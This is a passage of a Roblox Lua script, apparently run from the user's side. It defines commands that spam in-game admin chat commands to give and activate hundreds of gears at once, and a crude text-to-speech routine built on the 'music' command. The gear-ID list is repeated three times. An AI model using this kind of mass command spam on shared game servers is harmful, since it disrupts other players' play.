888479","1469850646","223785473","62803186","1215506016","46846074","1560600467","430065768","45201977"}
    for i=1,tonumber(args[1]) do
        game.Players:Chat("gear me "..gears[math.random(1,#gears)])
        wait()
    end
end)

addCommand("giveallgears",{},function()
    local gears = {"121946387","11419319","168141301","15932306","12187348","225921000","127506105","11377306","212296936","253519495","114020480","257810065","10472779","477910063","22960388","147143863","16688968","306971294","99119158","409745306","11452821","46846246","11563251","517827962","170897263","11999247","286526176","223439643","467138029","11453385","467935723","113328094","1402322831","22787248","928914739","16726030","95951330","12848902","16214845","44115926","42321801","52627419","1060280135","106701659","2350122208","1033136271","83021197","1016183873","168143042","1132887630","101106419","172246669","20721924","111876831","928913996","156467855","150366274","168140949","13745494","83021250","21392199","22788134","162857357","1180418251","101078559","28664212","461488745","11450664","116040770","107458429","30393548","13207169","12890798","243790334","21754543","124126871","170903216","57902859","2605965785","32355966","10727852","306971659","163350265","31314966","103358098","12145515","398675172","183355817","15177716","31839337","22596452","2568114215","321582427","295461517","365674685","81847570","119101539","2463674178","88146486","92142799","115377964","108875151","65545955","96669682","98411393","12547976","26421972","16979083","30847779","123234673","430066424","116040789","125859483","65082246","11956382","49491736","2506347092","24346755","89487934","78730532","383608755","1929597345","16722267","319656339","104642566","104642700","147143848","121925044","343586214","517827255","356212933","335132838","416846710","82357123","27494652","192456288","1304339797","236403380","57983532","639345143","92627988","83704169","14719505","168142869","2261167878","125013849","183355892","82357079","1340206957","99119198","168142394","211944997","26014536","2190019650","542755101","26017478","489196923","10758456","287425246","110789105","21440120","29100449","186868758","105289761","336370943","304721834","1241586091","163348575","88143074","73829214","87361806","35366155","34399428","103234612","439988813","1180417820","18474459","2605966484","346687565","30392263","746686384","168141496","1903663829","835780770","55301897","244082303","97161295","163348987","483899693","330296266","123234510","146047188","2569022418","170896941","255800146","15176169","35683911","81847365","15731350","302281291","14131602","29939404","2136391608","15668963","18482570","425121415","139578061","56561570","563288952","450566409","97311482","277955605","3459922232","13477890","118281609","549915884","58574445","19328185","380204314","295460702","218631022","106064469","2350119937","284135286","27858062","21445765","128160832","109583846","39258329","22152195","46360920","257343434","21351465","2463675080","52625744","58574452","29532138","2103276507","47597835","31314931","31839260","30649735","21440056","1117743696","107458461","172248941","163353363","380210977","27245855","34398653","33683368","57229313","30847733","173781053","15470183","542184488","34901961","46132907","154727251","109583822","94333296","142498104","987032734","1074742019","45754061","1829110586","18409191","206136532","122278207","880506541","114020538","16924676","46846115","928805891","1380774367","114687223","99797403","264989911","78367424","2804667002","28671909","112591865","29100543","25974222","226206253","228588651","19111883","189910805","162857391","236443047","44116233","38327125","323192649","10469910","28672001","101110605","32353654","738924664","101078350","20373160","35684857","14864611","58574416","402305186","11885154","18481407","25162389","41457719","31314849","20642023","1258015943","176219131","29345958","21439965","18479966","25158998","48596324","236441643","105189783","1645056094","11419882","99254437","94794774","78005009","2830533679","435116927","15970544","13206887","47871615","57229337","94794833","88143166","106701702","356213494","1929592959","101079008","13206856","183826384","37816777","218634097","327365543","81154592","29099749","1088051376","113299556","44561400","154727487","120749494","83021236","629893424","420161128","80576952","343587237","402304782","99797381","304720496","71037076","66896638","85754656","335086410","32858586","236401511","445150567","2045764727","215448210","42845896","108158439","170903610","63253706","15973059","79446473","2316760298","48159731","88885481","12504077","101191388","103234296","50938746","42845853","602146440","130925426","160189871","106701564","116040807","1230024287","56561593","101078524","151292047","98411325","65979823","754869699","24791472","21392417","53623248","319656563","21802000","1789547756","189756588","18482562","66416602","12902404","84012460","1760406591","157205782","1191128759","30847746","189910262","93136674","208659586","208659734","96095042","80576928","23306097","77443491","14492601","2620524562","233633874","29532089","66426498","158069071","1215515248","47871597","92142841","69964719","83704154","346687267","271017537","74385438","361950795","155662087","18017365","168142620","1258015236","456221232","160198363","346685995","33732371","93136666","1320966824","306163602","190094313","10831489","1360078533","221181437","69499437","215392741","86492467","55917409","92628074","1609498185","147143821","621090617","126719093","99254164","76170471","176087556","160199141","18426536","2620441860","85879465","97932897","49491781","172246820","1001649855","49929724","1304344132","63721711","233520425","2226815033","292969139","98219158","15973049","359244394","53623322","1492225511","24659699","128160929","154727343","97161222","178076749","248285248","610133129","24015579","99254358","91360052","90718350","1708354246","330296114","125013769","478707595","156467963","86494914","498752764","100472084","150366320","94233391","60888225","106701619","146047220","16986649","190094270","113299590","51346336","95951291","130113146","846792499","49929746","1103012605","61459592","129471121","183355732","295460073","62350846","21439991","129471170","95951270","49491716","191261808","147937284","181550181","226206639","68539623","17237675","15470222","176087597","159229806","336371164","59848474","68848741","124126528","176087466","243007180","335085355","12775410","356212121","91294485","420160506","127506324","79446395","563287969","82357101","69567827","73232803","158069180","2544539559","51757158","1402452608","174752245","12187431","63253701","2535102910","99797357","280662667","81330766","287424278","98341183","35293856","21416138","170902990","904534702","104642550","71597072","1132884456","233660801","315617026","315573586","206136361","105351748","413200176","178076831","74385399","59805584","45177979","218631128","1760404984","2445084910","188643628","233520257","66896542","190880295","87361508","37347081","80597060","204095670","54130543","91360028","77443436","553937189","107458531","1536052210","62350883","11115851","70476451","47262951","61916137","170903868","116055112","95258660","15179006","51346471","170896571","56561607","18462637","41457484","903197575","64220933","174752400","160189476","46846024","76170545","69210407","74904396","87361662","139578571","107458483","261439002","80576967","97885289","583159170","47597760","1241156683","746687364","302280931","99119261","10884288","522587921","268586231","186958653","277954704","206798405","48847374","51757126","532254782","70476435","14516975","34898883","118281529","24396804","243791145","19703476","68354832","835779898","146071355","264990158","120307951","101078326","73232786","129471151","1074738432","116693694","27171403","728207067","162857268","1708355542","123234626","155662051","26013203","23727705","88146497","99254241","50938773","42847923","163348758","332748371","332747438","72644644","97161241","97756645","273970482","161211085","236438668","1149193097","160198658","59175777","300410799","73829202","96669697","99254203","104642522","108149201","176087639","191261930","65079090","119101643","54694334","10468915","117498775","317593302","64220952","114020557","52180871","14131296","156467990","89491407","277955084","163355211","173755801","55917420","2163551089","1492226137","27860496","90220438","204095724","159199263","261827192","88146505","90220371","45513247","79446433","184760397","341109697","569678090","160189720","1033137155","621089209","168140813","71037056","139578136","95354259","215355320","54130559","2568200796","114687236","271017937","257343597","2222648398","178076989","99033296","93136746","65079094","2136389582","2463683230","22152234","40493542","22787168","1117745433","13206984","16641274","928796097","2045767145","241512134","118281463","95484354","98253592","176087640","236440696","155661985","125013830","83021217","150363993","70476425","24686580","76170515","97886188","186868641","431038614","183665698","152233381","52625733","88885506","17527923","156467926","243778818","1241587075","54694329","298087401","359179463","57229357","33866846","74385418","72644629","158069110","45941397","2409286506","159199218","13478015","12909278","1536053426","1587165780","66416590","59190543","1829078563","1241586595","99119240","59175769","257812862","159199229","286527185","188853857","74972442","2316759705","549914420","313547087","52180863","869125445","83704165","583157224","122278276","1320966419","11999279","74904413","66896601","46360870","2014805757","2385189785","52180878","22787189","226205948","33382711","1990279115","93709266","21420014","103338520","28277486","51346271","61916132","302502491","1046322934","271017031","84417104","221173389","330295904","50454041","257813288","78005082","64160547","395205750","13477940","228589017","64647651","255800783","181356054","56561579","34398938","185422295","49052716","106064315","54130552","18776718","128162713","163354553","477911027","503957703","62350856","728205177","162857422","1587175338","88143060","67319425","108158379","11999235","61459678","121385262","53623295","122278316","48159815","157205818","2463693263","248287898","102705430","1001653705","385780758","102705402","13841367","97161262","38326803","283756680","125859385","123234545","24440014","63721732","161220552","25741198","241017426","59806354","709399046","365642085","75556791","212500257","47262108","228588531","304720206","99641902","152187198","892003497","387285940","22971409","183355969","73232825","16987194","25545089","50454086","19111894","80661504","287426148","25926517","10510024","101106464","2620523077","60357959","73265108","130113061","78665215","139577901","20064349","527383094","2385192846","467137230","102705454","15470359","33867016","46362414","147937443","138761013","45094376","68603151","1981813154","236442380","96669687","85145662","903199054","188644205","53130867","42845684","65545971","86492583","537374622","254608905","76262706","22969230","16216702","169602010","241017568","2620521684","472607575","445151478","35366215","32858699","106064277","292969932","304719869","96669943","2620451289","53130896","206799274","503957396","92627975","60357989","483308034","503955938","33382537","87361995","511930668","170896461","113299641","108875216","60888308","70476446","163355404","11719016","187840979","18010691","321345839","34870758","183665514","85145626","52180858","86494893","53917288","45513203","22960435","84418938","858740936","45941451","68478587","55917432","71597048","66426103","93136802","100469994","273969902","152187131","53130887","124127383","332747874","88885497","1149579825","99610601","187688069","15397778","73888479","1469850646","223785473","62803186","1215506016","46846074","1560600467","430065768","45201977"}
for i,v in pairs(gears) do
    game.Players:Chat("gear me "..v)
    print("Given gear "..v.." "..i.."/"..#gears.." ("..tostring(#game.Players.LocalPlayer.Backpack:GetChildren()).." gears in backpack)")
    wait()
end
end)

addCommand("activateallgears",{},function()
    local gears = {"121946387","11419319","168141301","15932306","12187348","225921000","127506105","11377306","212296936","253519495","114020480","257810065","10472779","477910063","22960388","147143863","16688968","306971294","99119158","409745306","11452821","46846246","11563251","517827962","170897263","11999247","286526176","223439643","467138029","11453385","467935723","113328094","1402322831","22787248","928914739","16726030","95951330","12848902","16214845","44115926","42321801","52627419","1060280135","106701659","2350122208","1033136271","83021197","1016183873","168143042","1132887630","101106419","172246669","20721924","111876831","928913996","156467855","150366274","168140949","13745494","83021250","21392199","22788134","162857357","1180418251","101078559","28664212","461488745","11450664","116040770","107458429","30393548","13207169","12890798","243790334","21754543","124126871","170903216","57902859","2605965785","32355966","10727852","306971659","163350265","31314966","103358098","12145515","398675172","183355817","15177716","31839337","22596452","2568114215","321582427","295461517","365674685","81847570","119101539","2463674178","88146486","92142799","115377964","108875151","65545955","96669682","98411393","12547976","26421972","16979083","30847779","123234673","430066424","116040789","125859483","65082246","11956382","49491736","2506347092","24346755","89487934","78730532","383608755","1929597345","16722267","319656339","104642566","104642700","147143848","121925044","343586214","517827255","356212933","335132838","416846710","82357123","27494652","192456288","1304339797","236403380","57983532","639345143","92627988","83704169","14719505","168142869","2261167878","125013849","183355892","82357079","1340206957","99119198","168142394","211944997","26014536","2190019650","542755101","26017478","489196923","10758456","287425246","110789105","21440120","29100449","186868758","105289761","336370943","304721834","1241586091","163348575","88143074","73829214","87361806","35366155","34399428","103234612","439988813","1180417820","18474459","2605966484","346687565","30392263","746686384","168141496","1903663829","835780770","55301897","244082303","97161295","163348987","483899693","330296266","123234510","146047188","2569022418","170896941","255800146","15176169","35683911","81847365","15731350","302281291","14131602","29939404","2136391608","15668963","18482570","425121415","139578061","56561570","563288952","450566409","97311482","277955605","3459922232","13477890","118281609","549915884","58574445","19328185","380204314","295460702","218631022","106064469","2350119937","284135286","27858062","21445765","128160832","109583846","39258329","22152195","46360920","257343434","21351465","2463675080","52625744","58574452","29532138","2103276507","47597835","31314931","31839260","30649735","21440056","1117743696","107458461","172248941","163353363","380210977","27245855","34398653","33683368","57229313","30847733","173781053","15470183","542184488","34901961","46132907","154727251","109583822","94333296","142498104","987032734","1074742019","45754061","1829110586","18409191","206136532","122278207","880506541","114020538","16924676","46846115","928805891","1380774367","114687223","99797403","264989911","78367424","2804667002","28671909","112591865","29100543","25974222","226206253","228588651","19111883","189910805","162857391","236443047","44116233","38327125","323192649","10469910","28672001","101110605","32353654","738924664","101078350","20373160","35684857","14864611","58574416","402305186","11885154","18481407","25162389","41457719","31314849","20642023","1258015943","176219131","29345958","21439965","18479966","25158998","48596324","236441643","105189783","1645056094","11419882","99254437","94794774","78005009","2830533679","435116927","15970544","13206887","47871615","57229337","94794833","88143166","106701702","356213494","1929592959","101079008","13206856","183826384","37816777","218634097","327365543","81154592","29099749","1088051376","113299556","44561400","154727487","120749494","83021236","629893424","420161128","80576952","343587237","402304782","99797381","304720496","71037076","66896638","85754656","335086410","32858586","236401511","445150567","2045764727","215448210","42845896","108158439","170903610","63253706","15973059","79446473","2316760298","48159731","88885481","12504077","101191388","103234296","50938746","42845853","602146440","130925426","160189871","106701564","116040807","1230024287","56561593","101078524","151292047","98411325","65979823","754869699","24791472","21392417","53623248","319656563","21802000","1789547756","189756588","18482562","66416602","12902404","84012460","1760406591","157205782","1191128759","30847746","189910262","93136674","208659586","208659734","96095042","80576928","23306097","77443491","14492601","2620524562","233633874","29532089","66426498","158069071","1215515248","47871597","92142841","69964719","83704154","346687267","271017537","74385438","361950795","155662087","18017365","168142620","1258015236","456221232","160198363","346685995","33732371","93136666","1320966824","306163602","190094313","10831489","1360078533","221181437","69499437","215392741","86492467","55917409","92628074","1609498185","147143821","621090617","126719093","99254164","76170471","176087556","160199141","18426536","2620441860","85879465","97932897","49491781","172246820","1001649855","49929724","1304344132","63721711","233520425","2226815033","292969139","98219158","15973049","359244394","53623322","1492225511","24659699","128160929","154727343","97161222","178076749","248285248","610133129","24015579","99254358","91360052","90718350","1708354246","330296114","125013769","478707595","156467963","86494914","498752764","100472084","150366320","94233391","60888225","106701619","146047220","16986649","190094270","113299590","51346336","95951291","130113146","846792499","49929746","1103012605","61459592","129471121","183355732","295460073","62350846","21439991","129471170","95951270","49491716","191261808","147937284","181550181","226206639","68539623","17237675","15470222","176087597","159229806","336371164","59848474","68848741","124126528","176087466","243007180","335085355","12775410","356212121","91294485","420160506","127506324","79446395","563287969","82357101","69567827","73232803","158069180","2544539559","51757158","1402452608","174752245","12187431","63253701","2535102910","99797357","280662667","81330766","287424278","98341183","35293856","21416138","170902990","904534702","104642550","71597072","1132884456","233660801","315617026","315573586","206136361","105351748","413200176","178076831","74385399","59805584","45177979","218631128","1760404984","2445084910","188643628","233520257","66896542","190880295","87361508","37347081","80597060","204095670","54130543","91360028","77443436","553937189","107458531","1536052210","62350883","11115851","70476451","47262951","61916137","170903868","116055112","95258660","15179006","51346471","170896571","56561607","18462637","41457484","903197575","64220933","174752400","160189476","46846024","76170545","69210407","74904396","87361662","139578571","107458483","261439002","80576967","97885289","583159170","47597760","1241156683","746687364","302280931","99119261","10884288","522587921","268586231","186958653","277954704","206798405","48847374","51757126","532254782","70476435","14516975","34898883","118281529","24396804","243791145","19703476","68354832","835779898","146071355","264990158","120307951","101078326","73232786","129471151","1074738432","116693694","27171403","728207067","162857268","1708355542","123234626","155662051","26013203","23727705","88146497","99254241","50938773","42847923","163348758","332748371","332747438","72644644","97161241","97756645","273970482","161211085","236438668","1149193097","160198658","59175777","300410799","73829202","96669697","99254203","104642522","108149201","176087639","191261930","65079090","119101643","54694334","10468915","117498775","317593302","64220952","114020557","52180871","14131296","156467990","89491407","277955084","163355211","173755801","55917420","2163551089","1492226137","27860496","90220438","204095724","159199263","261827192","88146505","90220371","45513247","79446433","184760397","341109697","569678090","160189720","1033137155","621089209","168140813","71037056","139578136","95354259","215355320","54130559","2568200796","114687236","271017937","257343597","2222648398","178076989","99033296","93136746","65079094","2136389582","2463683230","22152234","40493542","22787168","1117745433","13206984","16641274","928796097","2045767145","241512134","118281463","95484354","98253592","176087640","236440696","155661985","125013830","83021217","150363993","70476425","24686580","76170515","97886188","186868641","431038614","183665698","152233381","52625733","88885506","17527923","156467926","243778818","1241587075","54694329","298087401","359179463","57229357","33866846","74385418","72644629","158069110","45941397","2409286506","159199218","13478015","12909278","1536053426","1587165780","66416590","59190543","1829078563","1241586595","99119240","59175769","257812862","159199229","286527185","188853857","74972442","2316759705","549914420","313547087","52180863","869125445","83704165","583157224","122278276","1320966419","11999279","74904413","66896601","46360870","2014805757","2385189785","52180878","22787189","226205948","33382711","1990279115","93709266","21420014","103338520","28277486","51346271","61916132","302502491","1046322934","271017031","84417104","221173389","330295904","50454041","257813288","78005082","64160547","395205750","13477940","228589017","64647651","255800783","181356054","56561579","34398938","185422295","49052716","106064315","54130552","18776718","128162713","163354553","477911027","503957703","62350856","728205177","162857422","1587175338","88143060","67319425","108158379","11999235","61459678","121385262","53623295","122278316","48159815","157205818","2463693263","248287898","102705430","1001653705","385780758","102705402","13841367","97161262","38326803","283756680","125859385","123234545","24440014","63721732","161220552","25741198","241017426","59806354","709399046","365642085","75556791","212500257","47262108","228588531","304720206","99641902","152187198","892003497","387285940","22971409","183355969","73232825","16987194","25545089","50454086","19111894","80661504","287426148","25926517","10510024","101106464","2620523077","60357959","73265108","130113061","78665215","139577901","20064349","527383094","2385192846","467137230","102705454","15470359","33867016","46362414","147937443","138761013","45094376","68603151","1981813154","236442380","96669687","85145662","903199054","188644205","53130867","42845684","65545971","86492583","537374622","254608905","76262706","22969230","16216702","169602010","241017568","2620521684","472607575","445151478","35366215","32858699","106064277","292969932","304719869","96669943","2620451289","53130896","206799274","503957396","92627975","60357989","483308034","503955938","33382537","87361995","511930668","170896461","113299641","108875216","60888308","70476446","163355404","11719016","187840979","18010691","321345839","34870758","183665514","85145626","52180858","86494893","53917288","45513203","22960435","84418938","858740936","45941451","68478587","55917432","71597048","66426103","93136802","100469994","273969902","152187131","53130887","124127383","332747874","88885497","1149579825","99610601","187688069","15397778","73888479","1469850646","223785473","62803186","1215506016","46846074","1560600467","430065768","45201977"}
for i,v in pairs(gears) do
    game.Players:Chat("gear me "..v)
    print("Given gear "..v.." "..i.."/"..#gears.." ("..tostring(#game.Players.LocalPlayer.Backpack:GetChildren()).." gears in backpack)")
    wait()
end
wait(0.25)
    for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        v.Parent = game.Players.LocalPlayer.Character
    end
    wait(0.1)
    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do 
        if v:IsA("Tool") then v:Activate() end
    end
end)

addCommand("activaterandomgears",{"amount"},function(args)
    local gears = {"121946387","11419319","168141301","15932306","12187348","225921000","127506105","11377306","212296936","253519495","114020480","257810065","10472779","477910063","22960388","147143863","16688968","306971294","99119158","409745306","11452821","46846246","11563251","517827962","170897263","11999247","286526176","223439643","467138029","11453385","467935723","113328094","1402322831","22787248","928914739","16726030","95951330","12848902","16214845","44115926","42321801","52627419","1060280135","106701659","2350122208","1033136271","83021197","1016183873","168143042","1132887630","101106419","172246669","20721924","111876831","928913996","156467855","150366274","168140949","13745494","83021250","21392199","22788134","162857357","1180418251","101078559","28664212","461488745","11450664","116040770","107458429","30393548","13207169","12890798","243790334","21754543","124126871","170903216","57902859","2605965785","32355966","10727852","306971659","163350265","31314966","103358098","12145515","398675172","183355817","15177716","31839337","22596452","2568114215","321582427","295461517","365674685","81847570","119101539","2463674178","88146486","92142799","115377964","108875151","65545955","96669682","98411393","12547976","26421972","16979083","30847779","123234673","430066424","116040789","125859483","65082246","11956382","49491736","2506347092","24346755","89487934","78730532","383608755","1929597345","16722267","319656339","104642566","104642700","147143848","121925044","343586214","517827255","356212933","335132838","416846710","82357123","27494652","192456288","1304339797","236403380","57983532","639345143","92627988","83704169","14719505","168142869","2261167878","125013849","183355892","82357079","1340206957","99119198","168142394","211944997","26014536","2190019650","542755101","26017478","489196923","10758456","287425246","110789105","21440120","29100449","186868758","105289761","336370943","304721834","1241586091","163348575","88143074","73829214","87361806","35366155","34399428","103234612","439988813","1180417820","18474459","2605966484","346687565","30392263","746686384","168141496","1903663829","835780770","55301897","244082303","97161295","163348987","483899693","330296266","123234510","146047188","2569022418","170896941","255800146","15176169","35683911","81847365","15731350","302281291","14131602","29939404","2136391608","15668963","18482570","425121415","139578061","56561570","563288952","450566409","97311482","277955605","3459922232","13477890","118281609","549915884","58574445","19328185","380204314","295460702","218631022","106064469","2350119937","284135286","27858062","21445765","128160832","109583846","39258329","22152195","46360920","257343434","21351465","2463675080","52625744","58574452","29532138","2103276507","47597835","31314931","31839260","30649735","21440056","1117743696","107458461","172248941","163353363","380210977","27245855","34398653","33683368","57229313","30847733","173781053","15470183","542184488","34901961","46132907","154727251","109583822","94333296","142498104","987032734","1074742019","45754061","1829110586","18409191","206136532","122278207","880506541","114020538","16924676","46846115","928805891","1380774367","114687223","99797403","264989911","78367424","2804667002","28671909","112591865","29100543","25974222","226206253","228588651","19111883","189910805","162857391","236443047","44116233","38327125","323192649","10469910","28672001","101110605","32353654","738924664","101078350","20373160","35684857","14864611","58574416","402305186","11885154","18481407","25162389","41457719","31314849","20642023","1258015943","176219131","29345958","21439965","18479966","25158998","48596324","236441643","105189783","1645056094","11419882","99254437","94794774","78005009","2830533679","435116927","15970544","13206887","47871615","57229337","94794833","88143166","106701702","356213494","1929592959","101079008","13206856","183826384","37816777","218634097","327365543","81154592","29099749","1088051376","113299556","44561400","154727487","120749494","83021236","629893424","420161128","80576952","343587237","402304782","99797381","304720496","71037076","66896638","85754656","335086410","32858586","236401511","445150567","2045764727","215448210","42845896","108158439","170903610","63253706","15973059","79446473","2316760298","48159731","88885481","12504077","101191388","103234296","50938746","42845853","602146440","130925426","160189871","106701564","116040807","1230024287","56561593","101078524","151292047","98411325","65979823","754869699","24791472","21392417","53623248","319656563","21802000","1789547756","189756588","18482562","66416602","12902404","84012460","1760406591","157205782","1191128759","30847746","189910262","93136674","208659586","208659734","96095042","80576928","23306097","77443491","14492601","2620524562","233633874","29532089","66426498","158069071","1215515248","47871597","92142841","69964719","83704154","346687267","271017537","74385438","361950795","155662087","18017365","168142620","1258015236","456221232","160198363","346685995","33732371","93136666","1320966824","306163602","190094313","10831489","1360078533","221181437","69499437","215392741","86492467","55917409","92628074","1609498185","147143821","621090617","126719093","99254164","76170471","176087556","160199141","18426536","2620441860","85879465","97932897","49491781","172246820","1001649855","49929724","1304344132","63721711","233520425","2226815033","292969139","98219158","15973049","359244394","53623322","1492225511","24659699","128160929","154727343","97161222","178076749","248285248","610133129","24015579","99254358","91360052","90718350","1708354246","330296114","125013769","478707595","156467963","86494914","498752764","100472084","150366320","94233391","60888225","106701619","146047220","16986649","190094270","113299590","51346336","95951291","130113146","846792499","49929746","1103012605","61459592","129471121","183355732","295460073","62350846","21439991","129471170","95951270","49491716","191261808","147937284","181550181","226206639","68539623","17237675","15470222","176087597","159229806","336371164","59848474","68848741","124126528","176087466","243007180","335085355","12775410","356212121","91294485","420160506","127506324","79446395","563287969","82357101","69567827","73232803","158069180","2544539559","51757158","1402452608","174752245","12187431","63253701","2535102910","99797357","280662667","81330766","287424278","98341183","35293856","21416138","170902990","904534702","104642550","71597072","1132884456","233660801","315617026","315573586","206136361","105351748","413200176","178076831","74385399","59805584","45177979","218631128","1760404984","2445084910","188643628","233520257","66896542","190880295","87361508","37347081","80597060","204095670","54130543","91360028","77443436","553937189","107458531","1536052210","62350883","11115851","70476451","47262951","61916137","170903868","116055112","95258660","15179006","51346471","170896571","56561607","18462637","41457484","903197575","64220933","174752400","160189476","46846024","76170545","69210407","74904396","87361662","139578571","107458483","261439002","80576967","97885289","583159170","47597760","1241156683","746687364","302280931","99119261","10884288","522587921","268586231","186958653","277954704","206798405","48847374","51757126","532254782","70476435","14516975","34898883","118281529","24396804","243791145","19703476","68354832","835779898","146071355","264990158","120307951","101078326","73232786","129471151","1074738432","116693694","27171403","728207067","162857268","1708355542","123234626","155662051","26013203","23727705","88146497","99254241","50938773","42847923","163348758","332748371","332747438","72644644","97161241","97756645","273970482","161211085","236438668","1149193097","160198658","59175777","300410799","73829202","96669697","99254203","104642522","108149201","176087639","191261930","65079090","119101643","54694334","10468915","117498775","317593302","64220952","114020557","52180871","14131296","156467990","89491407","277955084","163355211","173755801","55917420","2163551089","1492226137","27860496","90220438","204095724","159199263","261827192","88146505","90220371","45513247","79446433","184760397","341109697","569678090","160189720","1033137155","621089209","168140813","71037056","139578136","95354259","215355320","54130559","2568200796","114687236","271017937","257343597","2222648398","178076989","99033296","93136746","65079094","2136389582","2463683230","22152234","40493542","22787168","1117745433","13206984","16641274","928796097","2045767145","241512134","118281463","95484354","98253592","176087640","236440696","155661985","125013830","83021217","150363993","70476425","24686580","76170515","97886188","186868641","431038614","183665698","152233381","52625733","88885506","17527923","156467926","243778818","1241587075","54694329","298087401","359179463","57229357","33866846","74385418","72644629","158069110","45941397","2409286506","159199218","13478015","12909278","1536053426","1587165780","66416590","59190543","1829078563","1241586595","99119240","59175769","257812862","159199229","286527185","188853857","74972442","2316759705","549914420","313547087","52180863","869125445","83704165","583157224","122278276","1320966419","11999279","74904413","66896601","46360870","2014805757","2385189785","52180878","22787189","226205948","33382711","1990279115","93709266","21420014","103338520","28277486","51346271","61916132","302502491","1046322934","271017031","84417104","221173389","330295904","50454041","257813288","78005082","64160547","395205750","13477940","228589017","64647651","255800783","181356054","56561579","34398938","185422295","49052716","106064315","54130552","18776718","128162713","163354553","477911027","503957703","62350856","728205177","162857422","1587175338","88143060","67319425","108158379","11999235","61459678","121385262","53623295","122278316","48159815","157205818","2463693263","248287898","102705430","1001653705","385780758","102705402","13841367","97161262","38326803","283756680","125859385","123234545","24440014","63721732","161220552","25741198","241017426","59806354","709399046","365642085","75556791","212500257","47262108","228588531","304720206","99641902","152187198","892003497","387285940","22971409","183355969","73232825","16987194","25545089","50454086","19111894","80661504","287426148","25926517","10510024","101106464","2620523077","60357959","73265108","130113061","78665215","139577901","20064349","527383094","2385192846","467137230","102705454","15470359","33867016","46362414","147937443","138761013","45094376","68603151","1981813154","236442380","96669687","85145662","903199054","188644205","53130867","42845684","65545971","86492583","537374622","254608905","76262706","22969230","16216702","169602010","241017568","2620521684","472607575","445151478","35366215","32858699","106064277","292969932","304719869","96669943","2620451289","53130896","206799274","503957396","92627975","60357989","483308034","503955938","33382537","87361995","511930668","170896461","113299641","108875216","60888308","70476446","163355404","11719016","187840979","18010691","321345839","34870758","183665514","85145626","52180858","86494893","53917288","45513203","22960435","84418938","858740936","45941451","68478587","55917432","71597048","66426103","93136802","100469994","273969902","152187131","53130887","124127383","332747874","88885497","1149579825","99610601","187688069","15397778","73888479","1469850646","223785473","62803186","1215506016","46846074","1560600467","430065768","45201977"}
    for i=1,tonumber(args[1]) do
        game.Players:Chat("gear me "..gears[math.random(1,#gears)])
        wait()
    end
    wait(0.25)
    for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        v.Parent = game.Players.LocalPlayer.Character
    end
    wait(0.1)
    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do 
        if v:IsA("Tool") then v:Activate() end
    end
end)

addCommand("synthesize",{"text"},function(args)
	local TextConverter = {
	LetterSounds = {
		["a"] = {223757826, nil}; -- 203343899
		["b"] = {223533700, 0.2}; -- 203344029
		["c"] = {223533711, nil}; -- 203343994
		["d"] = {223757910, nil}; -- 203398237
		["e"] = {223758026, nil}; -- 203398295
		["f"] = {223777655, nil}; -- 203398347
		["g"] = {223777738, nil}; -- 203398372
		["h"] = {223777757, nil}; -- 203398397
		["i"] = {223777807, nil}; -- 203398422
		["j"] = {223782888, nil}; -- 203398450
		["k"] = {223533711, nil}; -- 203343994
		["l"] = {223782961, 0.4}; -- 203398541
		["m"] = {223782992, nil}; -- 203398578
		["n"] = {223783063, nil}; -- 203398599
		["o"] = {223783184, nil}; -- 203398611
		["p"] = {223783235, nil}; -- 203398727
		["q"] = {223783260, nil}; -- 203398755
		["r"] = {223783305, 0.2}; -- 203398792
		["s"] = {223783377, nil}; -- 203398806
		["t"] = {223783446, nil}; -- 203398850
		["u"] = {223783512, nil}; -- 203398872
		["v"] = {223783654, nil}; -- 203398965
		["w"] = {223783697, nil}; -- 203398984
		["x"] = {223783796, nil}; -- 203399008
		["y"] = {223783853, nil}; -- 203399043
		["z"] = {223783893, nil}; -- 203399096
		
		["ch"] = {223784367, 0.3}; -- 203592149
		["th"] = {223788235, 0.3}; -- 203399215
		["sh"] = {223784505, 0.2}; -- 203399566
		["wh"] = {223784555, 0.3}; -- 203622828
		["oo"] = {223784456, 0.3}; -- 203399743
		["ing"] = {223784393, 0.3}; -- 203402836
	};
	
	LongVowels = {
		["a"] = {223533687, nil}; -- 203343932
		["e"] = {223777620, nil}; -- 203398314
		["i"] = {223777855, nil}; -- 203398440
		["o"] = {223783212, nil}; -- 203398619
		["u"] = {223783572, nil}; -- 203398897
	};
	
	Pronounce = {
		["0"] = "zero";
		["1"] = "wun";
		["2"] = "too";
		["3"] = "three";
		["4"] = "four";
		["5"] = "five";
		["6"] = "six";
		["7"] = "seven";
		["8"] = "eyt";
		["9"] = "nine";
		["one"] = "wun";
		["two"] = "too";
		["eight"] = "eyt";
		["eigh"] = "ey";
		["gh"] = "h";
		["kn"] = "n";
		["come"] = "cu".."m";
		["bye"] = "bi";
		["#"] = "hashtag";
		["@"] = "at";
		["&"] = "and";
		["*"] = "astrict";
		["mn"] = "m";
		["kn"] = "n";
		["ies"] = "ees";
	};
	
	NonEnglishRules = {
		["to"] = "too";
		["you"] = "yoo";
		["we"] = "wee";
		["are"] = "erh";
		["your"] = "yoor";
		["you're"] = "yoor";
		["youre"] = "yoor";
		["pizza"] = "peetzoh";
		["ok"] = "okay";
		["have"] = "hav";
		["my"] = "mi";
		["me"] = "mee";
		["u"] = "yoo";
		["r"] = "erh";
		["move"] = "moov";
		["dove"] = "duv";
		["debris"] = "debree";
		["do"] = "doo";
	}
}

local function MakeSound(Parent, ID, Volume, Pitch, Looped)
	game.Players:Chat("music "..tostring(ID))
end

local function IsSpacer(Input)
	if Input == " " or Input == "." or Input == "-" or Input == "," or Input == "?" or Input == "!" or Input == "	" or Input == nil or Input == "" then
		return true
	else
		return false
	end
end

local function IsVowel(Input)
	Input = string.lower(tostring(Input))
	if Input == "a" or Input == "e" or Input == "i" or Input == "o" or Input == "u" then
		return true
	else
		return false
	end
end

local function ValidE(Input)
	if not Input then return nil end
	if string.lower(Input) == "e" or Input == "~" then
		return true
	else
		return false
	end
end

local function ConvertText(Text)
	Text = string.lower(tostring(Text))
	local Letters = {}
	local IDs = {}
	for Rule,Replace in pairs(TextConverter.Pronounce) do
		Text = string.gsub(Text,string.lower(Rule),string.lower(Replace))
	end
	for Rule,Replace in pairs(TextConverter.NonEnglishRules) do
		local Start, End = string.find(Text, string.lower(Rule))
		
		if Start and End and IsSpacer(string.sub(Text, Start-1, Start-1)) and IsSpacer(string.sub(Text, End+1, End+1)) then
			Text = string.gsub(Text, string.lower(Rule), Replace)
		end
	end
